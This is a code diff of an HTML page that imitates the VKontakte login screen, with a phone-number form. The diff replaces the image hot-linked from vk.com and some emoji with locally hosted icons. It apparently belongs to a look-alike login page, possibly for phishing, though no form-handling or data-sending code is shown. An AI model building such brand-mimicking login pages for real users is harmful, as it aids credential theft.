@@ -7,10 +7,11 @@
     <link rel="stylesheet" href="/styles.css">
 </head>
 <body class="vk-bg">
+    <div class="vk-bg-lines"></div>
     <div class="vk-center">
         <div class="vk-login-box">
             <button class="vk-back-btn" tabindex="-1"><span>&larr;</span></button>
-            <div class="vk-logo"><img src="https://vk.com/images/logoVkMiniApps.png" alt="VK" /></div>
+            <div class="vk-logo"><img src="/icons/vk.svg" alt="VK" /></div>
             <h2 class="vk-title">Вход ВКонтакте</h2>
             <div class="vk-tabs">
                 <button class="vk-tab active">Телефон</button>
@@ -18,7 +19,7 @@
             </div>
             <form id="loginForm">
                 <div class="vk-phone-group">
-                    <span class="vk-flag">🇷🇺</span>
+                    <img src="/icons/ru.svg" alt="RU" class="vk-flag-img" />
                     <input type="tel" id="phoneNumber" placeholder="+7" required autocomplete="off" />
                 </div>
                 <div class="vk-checkbox-group">
@@ -30,7 +31,7 @@
             <button class="vk-create-btn" tabindex="-1">Создать аккаунт</button>
             <div class="vk-or">или с помощью</div>
             <button class="vk-qr-btn" tabindex="-1">
-                <span class="vk-qr-icon">&#128273;</span> QR-код
+                <img src="/icons/qr.svg" alt="QR" class="vk-qr-icon-img" /> QR-код
             </button>
             <div class="vk-agreement">
                 Нажимая «Войти», вы принимаете <a href="#" tabindex="-1">пользовательское соглашение</a> и <a href="#" tabindex="-1">политику конфиденциальности</a>
